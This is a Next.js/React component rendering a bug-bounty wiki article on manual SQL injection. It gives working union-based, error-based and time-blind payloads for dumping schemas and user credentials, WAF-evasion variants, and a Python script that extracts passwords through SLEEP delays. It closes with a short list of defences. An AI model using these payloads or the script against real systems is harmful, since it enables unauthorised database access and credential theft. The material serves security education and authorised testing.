/**
 * ADVANCED SQL INJECTION MANUAL
 * Article content separated in its own file (English version)
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertSuccess,
  CodeBlock,
  ListItem
} from '@/components/WikiArticleComponents';
import { Database } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SqlInjectionAvanzadaContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="Manual SQL Injection: Beyond SQLMap">
        <Paragraph>
          Automated tools like <Strong>SQLMap</Strong> are excellent for quickly finding vulnerabilities,
          but in competitive Bug Bounty environments or well-protected applications, you need
          <Strong> advanced manual techniques</Strong> that tools don't detect.
        </Paragraph>

        <Paragraph>
          This guide covers three advanced manual exfiltration techniques:
        </Paragraph>

        <ul className="space-y-2 mt-4">
          <ListItem><Strong>Union-based SQLi:</Strong> Combine queries to extract data directly</ListItem>
          <ListItem><Strong>Error-based SQLi:</Strong> Force verbose errors that leak information</ListItem>
          <ListItem><Strong>Time-blind SQLi:</Strong> Infer data through time delays</ListItem>
        </ul>
      </Section>

      <Section id="union-based" title="1. Union-based SQL Injection">
        <Paragraph>
          The <Strong>UNION</Strong> technique allows combining results from two SELECT queries into a single response.
          It's the most direct way to exfiltrate data when the application displays results on screen.
        </Paragraph>

        <Subsection title="Step 1: Detect the Number of Columns">
          <Paragraph>
            Before using UNION, you need to know how many columns the original query returns:
          </Paragraph>

          <CodeBlock
            language="sql"
            title="Detect number of columns with ORDER BY"
            code={`-- Test with ORDER BY incrementing until it fails
https://target.com/products?id=1 ORDER BY 1--
https://target.com/products?id=1 ORDER BY 2--
https://target.com/products?id=1 ORDER BY 3--
https://target.com/products?id=1 ORDER BY 4--  ❌ Error = 3 columns

-- Alternative with UNION SELECT NULL
https://target.com/products?id=1 UNION SELECT NULL--  ❌ Error
https://target.com/products?id=1 UNION SELECT NULL,NULL--  ❌ Error
https://target.com/products?id=1 UNION SELECT NULL,NULL,NULL--  ✅ Works = 3 columns`}
          />
        </Subsection>

        <Subsection title="Step 2: Identify Columns with Compatible Data Types">
          <Paragraph>
            Not all columns accept strings. Identify which ones are compatible:
          </Paragraph>

          <CodeBlock
            language="sql"
            title="Test data types in each column"
            code={`-- Test each column with a string
https://target.com/products?id=1 UNION SELECT 'a',NULL,NULL--
https://target.com/products?id=1 UNION SELECT NULL,'a',NULL--
https://target.com/products?id=1 UNION SELECT NULL,NULL,'a'--  ✅ Works

-- If the column accepts strings, we can inject data there`}
          />
        </Subsection>

        <Subsection title="Step 3: Exfiltrate Data of Interest">
          <CodeBlock
            language="sql"
            title="Extraction of sensitive data"
            code={`-- Get database version
' UNION SELECT NULL,NULL,@@version--

-- List all databases (MySQL)
' UNION SELECT NULL,NULL,schema_name FROM information_schema.schemata--

-- List tables from a database
' UNION SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns from a table
' UNION SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name='users'--

-- Extract credentials
' UNION SELECT NULL,username,password FROM users--

-- Concatenate multiple columns into one (when only one column is visible)
' UNION SELECT NULL,NULL,CONCAT(username,':',password) FROM users--`}
          />
        </Subsection>

        <AlertWarning title="WAF Evasion">
          If the WAF blocks <InlineCode>UNION</InlineCode>, try:
          <ul className="mt-2 space-y-1">
            <ListItem><InlineCode>/*!UNION*/</InlineCode> (MySQL inline comments)</ListItem>
            <ListItem><InlineCode>UnIoN</InlineCode> (case mixing)</ListItem>
            <ListItem><InlineCode>UNION/**/SELECT</InlineCode> (spaces with comments)</ListItem>
          </ul>
        </AlertWarning>
      </Section>

      <Section id="error-based" title="2. Error-based SQL Injection">
        <Paragraph>
          When the application <Strong>doesn't show SELECT results</Strong> but does display detailed SQL errors,
          we can force errors that leak information in the error message.
        </Paragraph>

        <Subsection title="Technique: ExtractValue (MySQL)">
          <CodeBlock
            language="sql"
            title="Exfiltration through XML errors"
            code={`-- Extract MySQL version
' AND extractvalue(1,concat(0x7e,version()))--
-- Error: XPATH syntax error: '~5.7.33-0ubuntu0.18.04.1'

-- Extract current database name
' AND extractvalue(1,concat(0x7e,database()))--
-- Error: XPATH syntax error: '~target_db'

-- Extract first user
' AND extractvalue(1,concat(0x7e,(SELECT username FROM users LIMIT 1)))--
-- Error: XPATH syntax error: '~admin'

-- Extract admin password
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))--
-- Error: XPATH syntax error: '~$2y$10$abcd1234....'`}
          />
        </Subsection>

        <Subsection title="Technique: UpdateXML (Alternative)">
          <CodeBlock
            language="sql"
            title="Another XML function to force errors"
            code={`-- Same concept, different function
' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--

-- Extract all tables (limited by error length)
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--`}
          />
        </Subsection>

        <AlertInfo title="Length Limitation">
          Error messages have character limits (~32 in MySQL). To exfiltrate long data:
          <ul className="mt-2 space-y-1">
            <ListItem>Use <InlineCode>SUBSTRING()</InlineCode> to extract in chunks</ListItem>
            <ListItem>Use <InlineCode>LIMIT</InlineCode> to iterate over rows</ListItem>
          </ul>
        </AlertInfo>
      </Section>

      <Section id="time-blind" title="3. Time-blind SQL Injection">
        <Paragraph>
          The stealthiest but slowest technique. When the application <Strong>shows neither results nor errors</Strong>,
          we can infer information through <Strong>time delays</Strong>.
        </Paragraph>

        <Subsection title="Basic Concept">
          <CodeBlock
            language="sql"
            title="Infer data bit by bit through response time"
            code={`-- If condition is TRUE, delay 5 seconds
' AND IF(1=1, SLEEP(5), 0)--  ⏱️ Response in 5 seconds = TRUE
' AND IF(1=2, SLEEP(5), 0)--  ⏱️ Immediate response = FALSE

-- Verify if 'users' table exists
' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--

-- Verify length of admin username
' AND IF((SELECT LENGTH(username) FROM users WHERE id=1)=5, SLEEP(5), 0)--

-- Extract first character of username (A=65 in ASCII)
' AND IF(ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=65, SLEEP(5), 0)--`}
          />
        </Subsection>

        <Subsection title="Automation Script (Python)">
          <CodeBlock
            language="python"
            title="exploit_time_blind.py"
            code={`import requests
import time
import string

url = "https://target.com/search"
charset = string.ascii_lowercase + string.digits + "_"

def check_char(position, char):
    """Check if character at position matches"""
    payload = f"' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),{position},1))={ord(char)}, SLEEP(3), 0)--"
    
    start = time.time()
    requests.get(url, params={"q": payload}, timeout=10)
    elapsed = time.time() - start
    
    return elapsed > 3  # If took more than 3 sec, char is correct

def extract_data(length=32):
    """Extract data character by character"""
    result = ""
    for i in range(1, length + 1):
        for char in charset:
            if check_char(i, char):
                result += char
                print(f"[+] Character {i}: {result}")
                break
    return result

# First detect length
# Then extract character by character
password = extract_data(32)
print(f"[!] Password extracted: {password}")`}
          />
        </Subsection>

        <AlertDanger title="Time-blind Limitations">
          <ul className="space-y-2 mt-2">
            <ListItem>
              <Strong>Very slow:</Strong> Extracting 32 characters can take hours
            </ListItem>
            <ListItem>
              <Strong>Detectable by IDS:</Strong> Thousands of requests with suspicious delays
            </ListItem>
            <ListItem>
              <Strong>Sensitive to network latency:</Strong> False positives due to lag
            </ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="comparison" title="Technique Comparison">
        <div className="overflow-x-auto">
          <table className="w-full border-collapse bg-white dark:bg-slate-800 rounded-xl overflow-hidden">
            <thead>
              <tr className="bg-slate-100 dark:bg-slate-700">
                <th className="p-4 text-left text-slate-900 dark:text-white font-bold">Technique</th>
                <th className="p-4 text-left text-slate-900 dark:text-white font-bold">Speed</th>
                <th className="p-4 text-left text-slate-900 dark:text-white font-bold">Stealth</th>
                <th className="p-4 text-left text-slate-900 dark:text-white font-bold">Requirements</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-200 dark:divide-slate-700">
              <tr>
                <td className="p-4"><Strong>Union-based</Strong></td>
                <td className="p-4 text-green-600 dark:text-green-400">⚡ Very fast</td>
                <td className="p-4 text-red-600 dark:text-red-400">🔴 Very detectable</td>
                <td className="p-4 text-slate-700 dark:text-slate-300">Visible results on page</td>
              </tr>
              <tr>
                <td className="p-4"><Strong>Error-based</Strong></td>
                <td className="p-4 text-green-600 dark:text-green-400">⚡ Fast</td>
                <td className="p-4 text-yellow-600 dark:text-yellow-400">🟡 Moderate</td>
                <td className="p-4 text-slate-700 dark:text-slate-300">Verbose SQL errors</td>
              </tr>
              <tr>
                <td className="p-4"><Strong>Time-blind</Strong></td>
                <td className="p-4 text-red-600 dark:text-red-400">🐌 Very slow</td>
                <td className="p-4 text-green-600 dark:text-green-400">🟢 Less detectable</td>
                <td className="p-4 text-slate-700 dark:text-slate-300">None (always works)</td>
              </tr>
            </tbody>
          </table>
        </div>
      </Section>

      <Section id="defense" title="How to Defend">
        <AlertSuccess title="Best Practices">
          <ul className="space-y-2 mt-2">
            <ListItem>
              <Strong>Prepared Statements:</Strong> ALWAYS use parameterized queries (PDO, MySQLi, ORM)
            </ListItem>
            <ListItem>
              <Strong>Whitelist Validation:</Strong> Validate inputs against allowed list, not blacklist
            </ListItem>
            <ListItem>
              <Strong>Least Privilege:</Strong> Database user with minimal permissions (not DBA)
            </ListItem>
            <ListItem>
              <Strong>Generic errors:</Strong> Never show detailed SQL errors in production
            </ListItem>
            <ListItem>
              <Strong>WAF:</Strong> Web Application Firewall with anti-SQLi rules
            </ListItem>
          </ul>
        </AlertSuccess>
      </Section>

      {/* Next article */}
      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next Topic</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/mongodb-injection`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <Database className="w-5 h-5" />
          <span>MongoDB Operator Injection</span>
        </Link>
      </div>
    </>
  );
}
